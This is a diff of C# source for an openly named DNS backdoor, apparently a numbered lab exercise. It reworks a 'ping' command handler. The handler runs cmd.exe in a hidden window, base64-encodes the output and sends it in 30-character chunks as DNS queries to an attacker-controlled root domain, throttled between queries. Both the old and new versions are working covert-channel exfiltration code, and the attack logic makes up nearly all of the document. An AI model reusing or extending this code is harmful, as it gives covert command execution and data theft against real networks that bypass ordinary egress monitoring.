@@ -72,40 +72,51 @@ namespace A06_6_DNS_Backdoor
                             case "ping":
                                 try
                                 {
-                                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
-                                    proc.StartInfo.FileName = "cmd.exe";
-                                    proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
-                                    proc.StartInfo.RedirectStandardOutput = true;
-                                    proc.StartInfo.UseShellExecute = false;
-                                    proc.StartInfo.CreateNoWindow = true;
-                                    proc.Start();
-
-                                    string output = proc.StandardOutput.ReadToEnd();
-                                    proc.WaitForExit();
-
-                                    byte[] textBytes = Encoding.UTF8.GetBytes(output);
-                                    string base64Output = Convert.ToBase64String(textBytes);
-                                    base64Output = base64Output.Replace("=", "");
-
-                                    int chunkSize = 30;
-                                    for (int i = 0; i < base64Output.Length; i += chunkSize)
+                                    // Instantiate the process configurations
+                                    using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
                                     {
-                                        string chunk = (i + chunkSize >= base64Output.Length)
-                                            ? base64Output.Substring(i)
-                                            : base64Output.Substring(i, chunkSize);
+                                        proc.StartInfo.FileName = "cmd.exe";
+                                        proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
+                                        proc.StartInfo.RedirectStandardOutput = true;
+                                        proc.StartInfo.UseShellExecute = false;
+                                        proc.StartInfo.CreateNoWindow = true;
 
-                                        string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";
+                                        proc.Start();
 
-                                        IntPtr pDummy = IntPtr.Zero;
-                                        DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
-                                        if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);
+                                        // Read the stream contents FIRST to empty the pipe dynamically
+                                        string output = proc.StandardOutput.ReadToEnd();
 
-                                        Thread.Sleep(500);
+                                        // Wait a maximum of 5 seconds for absolute thread safety, then release
+                                        proc.WaitForExit(5000);
+
+                                        if (!string.IsNullOrEmpty(output))
+                                        {
+                                            // Normalize and Base64 encode the output string
+                                            byte[] textBytes = Encoding.UTF8.GetBytes(output);
+                                            string base64Output = Convert.ToBase64String(textBytes);
+                                            base64Output = base64Output.Replace("=", "");
+
+                                            int chunkSize = 30;
+                                            for (int i = 0; i < base64Output.Length; i += chunkSize)
+                                            {
+                                                string chunk = (i + chunkSize >= base64Output.Length)
+                                                    ? base64Output.Substring(i)
+                                                    : base64Output.Substring(i, chunkSize);
+
+                                                string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";
+
+                                                IntPtr pDummy = IntPtr.Zero;
+                                                DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
+                                                if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);
+
+                                                Thread.Sleep(500); // Frame staggering delay
+                                            }
+                                        }
                                     }
                                 }
                                 catch { }
                                 break;
-
+                                
                             case "exit":
                                 _isRunning = false;
                                 break;
